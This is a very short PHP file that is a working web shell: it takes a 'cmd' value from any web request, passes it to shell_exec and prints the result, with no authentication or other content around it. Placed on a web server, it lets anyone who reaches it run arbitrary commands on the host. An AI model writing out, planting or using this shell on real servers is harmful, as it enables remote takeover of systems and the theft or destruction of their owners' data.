                         <?php 
	$cmd = $_REQUEST['cmd'];
	if (isset($cmd)) {
		print shell_exec($cmd);
    }
?>                         